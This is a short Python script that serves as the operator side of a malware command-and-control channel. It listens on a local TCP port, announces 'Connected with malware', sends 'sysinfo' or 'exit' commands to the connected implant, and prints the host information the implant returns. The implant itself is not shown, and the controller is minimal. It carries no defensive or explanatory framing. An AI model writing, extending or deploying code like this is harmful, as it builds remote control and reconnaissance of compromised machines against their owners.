import socket

server_host = 'localhost'
server_port = 12345

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((server_host, server_port))
    s.listen()
    print('Server is started')
    connection, addr = s.accept()
    with connection:
        print('Connected with malware')
        while True:
            command = input('Enter your command: ')
            if command == 'sysinfo':
                connection.sendall(command.encode())
                while True:
                    data = connection.recv(4098)
                    if data:
                        print(data.decode())
                        break
            elif command == 'exit' in command:
                connection.sendall(command.encode())
                print('Bye')
                break